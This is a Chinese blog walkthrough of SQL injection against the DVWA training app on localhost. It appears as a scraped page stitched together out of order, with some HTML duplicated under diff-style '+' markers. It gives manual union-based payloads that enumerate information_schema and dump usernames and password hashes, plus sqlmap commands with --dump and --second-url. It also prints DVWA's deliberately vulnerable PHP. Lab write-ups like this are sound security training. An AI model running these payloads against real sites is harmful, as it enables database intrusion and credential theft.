class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#high.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $id = $_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],$query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>($row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">            $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：加了<code>limit 1</code>限制输出，但是可以直接使用<code>#</code>注释掉，解法与<code>Low Security Level</code>相同。</p><p>查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；</p><p>但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：<code>--second-url=&quot;xxxurl&quot;</code>（设置二阶响应的结果显示页面的url）</p><p>输入<code>sqlmap -r data.txt -p id --second-url=&quot;http://localhost/dvwa/vulnerabilities/sqli/index.php&quot;</code>检测是否存在SQL注入，结果如下，存在注入点，后续操作与MEDIUM注入相同；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116113840.png" alt=""></p><h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#impossible.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        checkToken($_REQUEST[<span class="string">'user_token'</span>],$_SESSION[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Was a number entered?</span></span><br><span class="line">        <span class="keyword">if</span>(is_numeric($id))&#123;</span><br><span class="line">            <span class="comment">// Check the database</span></span><br><span class="line">            $data = $db-&gt;prepare(<span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span>);</span><br><span class="line">            $data-&gt;bindParam(<span class="string">':id'</span>,$id,PDO::PARAM_INT);</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line">            $row = $data-&gt;fetch();</span><br><span class="line">            <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">            <span class="keyword">if</span>($data-&gt;rowCount()==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">// Get values</span></span><br><span class="line">                $first = $row[<span class="string">'first_name'</span>];</span><br><span class="line">                $last  = $row[<span class="string">'last_name'</span>];</span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br/&gt;First name: &#123;$first&#125;&lt;br/&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：采用了<code>PDO</code>技术，划清了代码与数据的界限，有效防御 SQL 注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了SQL注入攻击，<code>Anti-CSRFtoken</code> 机制的加入了进一步提高了安全性。</p></div><div class="my_post_copyright"><script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script><script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script><script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script><link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"><link href="css/font-awesome.min.css?v=4.7.0" rel="stylesheet"><script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script><p><span>本文标题: </span><a href="/DVWA-SQL-Injection.html">DVWA SQL Injection</a></p><p><span>文章作者: </span><a href="/" title="访问 李钰璕 的个人博客">李钰璕</a></p><p><span>发布时间: </span>2019年11月15日 - 16:30</p><p><span>最后更新: </span>2020年11月16日 - 22:16</p><p><span>原始链接: </span><a href="/DVWA-SQL-Injection.html" title="DVWA SQL Injection"><a href="https://www.leeyuxun.github.io/DVWA-SQL-Injection.html" title="DVWA SQL Injection">https://www.leeyuxun.github.io/DVWA-SQL-Injection.html</a></a></p><p><span>许可协议: </span>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"> <i class="fab fa-creative-commons"></i>BY-NC-SA </a>许可协议，转载请注明出处！</p></div><footer class="post-footer"><div class="post-tags"><a href="/tags/SQL-Injection/" rel="tag"><i class="fa fa-tag"></i> SQL Injection</a> <a href="/tags/SQLmap/" rel="tag"><i class="fa fa-tag"></i> SQLmap</a></div><div class="post-nav"><div class="post-nav-item"><a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%BA%8C.html" rel="prev" title="漏洞分析技术实验二"><i class="fa fa-chevron-left"></i> 漏洞分析技术实验二</a></div><div class="post-nav-item"><a href="/DVWA-SQL-Injection-Blind.html" rel="next" title="DVWA SQL Injection (Blind)">DVWA SQL Injection (Blind) <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><script>window.addEventListener('tabs:register', () => {
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="前言记录学习DVWA中的SQL注入过程，包括手工注入、SQLmap注入两部分。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA SQL Injection">
+<meta property="og:url" content="https://www.leeyuxun.github.io/DVWA-SQL-Injection.html">
+<meta property="og:site_name" content="Leeyuxun の blog">
+<meta property="og:description" content="前言记录学习DVWA中的SQL注入过程，包括手工注入、SQLmap注入两部分。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171123.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171335.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171423.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172008.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172046.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172123.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172625.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172816.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115174208.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115202820.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115203412.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204341.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204558.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204755.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204946.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115205247.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115211926.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212532.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212630.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212909.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213015.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213055.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213329.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213543.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115214838.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215648.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215916.png">
+<meta property="og:image" content="https://www.leeyuxun.github.io/Users/leeyuxun/Library/Application%20Support/typora-user-images/image-20201115223004551.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223436.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223610.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223751.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115223931.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115224153.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116113840.png">
+<meta property="article:published_time" content="2019-11-15T08:30:19.000Z">
+<meta property="article:modified_time" content="2020-11-16T14:16:33.547Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="SQL Injection">
+<meta property="article:tag" content="SQLmap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171123.png">
+
+<link rel="canonical" href="https://www.leeyuxun.github.io/DVWA-SQL-Injection.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DVWA SQL Injection | Leeyuxun の blog</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.leeyuxun.github.io/DVWA-SQL-Injection.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="从0开始学习网络安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA SQL Injection
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-15 16:30:19" itemprop="dateCreated datePublished" datetime="2019-11-15T16:30:19+08:00">2019-11-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-16 22:16:33" itemprop="dateModified" datetime="2020-11-16T22:16:33+08:00">2020-11-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/DVWA/" itemprop="url" rel="index"><span itemprop="name">DVWA</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录学习DVWA中的SQL注入过程，包括手工注入、SQLmap注入两部分。<a id="more"></a></p>
+<p>目的：爆破数据库，通过SQL注入，找到dvwa网站所有的用户名及密码。</p>
+<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># low.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $id = $_REQUEST[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        $query = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],$query ) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>]))? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]):(($___mysqli_res = mysqli_connect_error())? $___mysqli_res : <span class="keyword">false</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>($row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">            $last = $row[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：服务器端的low.php并没有对客户输入的id进行任何检查与过滤，直接将SQL语句的执行结果显示给客户端。</p>
+<h2 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h2><h3 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h3><p>判断是否存在注入以及注入类型——字符型/数字型</p>
+<ol>
+<li><p>输入<code>1</code>，查询成功；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171123.png" alt=""></p>
+</li>
+<li><p>输入<code>1&#39; and &#39;1&#39;=&#39;2</code>查询失败，无回显；</p>
+</li>
+<li><p>输入<code>1&#39; and &#39;1&#39;=&#39;1</code>查询成功；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171335.png" alt=""></p>
+</li>
+<li><p>输入<code>1&#39;</code>报错；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171423.png" alt=""></p>
+</li>
+</ol>
+<p>根据上述发现猜测存在<strong>字符型注入</strong>。</p>
+<h3 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h3><p>使用<code>order by</code>猜测SQL查询语句中的字段数，为union查询做准备</p>
+<ol>
+<li><p>输入<code>1&#39; or 1=1 order by 1 #</code>，查询成功；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172008.png" alt=""></p>
+</li>
+<li><p>输入<code>1&#39; or 1=1 order by 2 #</code>，查询成功；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172046.png" alt=""></p>
+</li>
+<li><p>输入<code>1&#39; or 1=1 order by 3 #</code>，查询失败；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172123.png" alt=""></p>
+</li>
+</ol>
+<p>说明查询语句中存在2个字段，即First name和Surname；</p>
+<h3 id="确定显示字段顺序"><a href="#确定显示字段顺序" class="headerlink" title="确定显示字段顺序"></a>确定显示字段顺序</h3><p>输入<code>1&#39; union select 1,2 #</code>，查询成功，两个字段显示如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172625.png" alt=""></p>
+<h3 id="获取当前数据库和用户名"><a href="#获取当前数据库和用户名" class="headerlink" title="获取当前数据库和用户名"></a>获取当前数据库和用户名</h3><p>输入<code>1&#39; union select database(),user() #</code>，查看数据库为dvwa，用户为dvwa；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172816.png" alt=""></p>
+<h3 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h3><p>输入<code>1&#39; union select TABLE_NAME,2 from information_schema.TABLES where TABLE_SCHEMA=&#39;dvwa&#39; #</code>，获取表名为guestbook和users</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115174208.png" alt=""></p>
+<h3 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h3><p>输入<code>1&#39; union select COLUMN_NAME,2 from information_schema.COLUMNS where TABLE_NAME=&#39;users&#39; #</code>，获取字段如下user_id、first_name、last_name、user、password、avatar、last_login、failed_login、USER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115202820.png" alt=""></p>
+<h3 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h3><p>输入<code>1&#39; union select user,password from users #</code>，获取users表中的所有用户和密码；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115203412.png" alt=""></p>
+<p>查看表guestbook同理。</p>
+<h2 id="SQLmap注入"><a href="#SQLmap注入" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h2><h3 id="注入判断-1"><a href="#注入判断-1" class="headerlink" title="注入判断"></a>注入判断</h3><p>注意：dvwa需要登录才能访问漏洞测试页面，所以使用sqlmap时需要提交登录后的cookie，cookie中有关于dvwa的security level设置属性；</p>
+<p>输入<code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot;</code>，发现存在SQL注入点id(GET),数据库类型为mysql；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204341.png" alt=""></p>
+<h3 id="爆破数据库"><a href="#爆破数据库" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p>输入 <code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot; --dbs</code>，爆破数据库如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204558.png" alt=""></p>
+<h3 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h3><p>选择dvwa数据库，输入<code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot; -D dvwa --tables</code>，爆破数据表如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204755.png" alt=""></p>
+<h3 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h3><p>选择users表，输入<code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot; -D dvwa -T users --columns</code>，爆破字段如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204946.png" alt=""></p>
+<h3 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h3><p>输入<code>sqlmap -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5&quot; -D dvwa -T users -C user,password --dump</code>，爆破user、password字段内容如下；</p>
